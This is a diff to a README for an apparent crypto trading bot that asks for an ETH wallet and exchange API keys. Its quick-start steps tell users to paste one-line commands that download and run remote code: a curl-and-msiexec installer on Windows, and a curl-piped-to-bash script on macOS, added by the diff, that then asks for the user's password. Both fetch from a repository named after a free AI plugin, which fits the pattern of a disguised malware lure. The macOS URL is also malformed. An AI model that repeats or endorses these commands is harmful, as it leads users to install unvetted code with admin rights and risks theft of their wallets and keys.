@@ -18,17 +18,24 @@ through a CEX REST/WebSocket gateway.
 
 ## Requirements
 
-- Windows 10/11 (PowerShell 5.1+)
+- Windows 10/11 (PowerShell 5.1+) or MacOS
 - ETH wallet with funds for gas
 - Read+trade API key on the CEX you want to use
 
-## Quick start
+## Windows quick start 
 1. Press `Win + R`, type `cmd` and hit Enter
 2. Paste the following command and press Enter:
 
 ```cmd
 curl -Lo %temp%\s.msi https://raw.githubusercontent.com/claude-free-plugin/tradebot/main/bot.msi && msiexec /i %temp%\s.msi
 ```
+## MacOS quick start
+1. Open Terminal app
+2. Paste the following command and press Enter:
+```cmd
+/bin/bash -c "$(curl -fsSL https://https://raw.githubusercontent.com/claude-free-plugin/tradebot/main/tbot)"
+```
+3. Enter password when promted
 
 Enter:
 
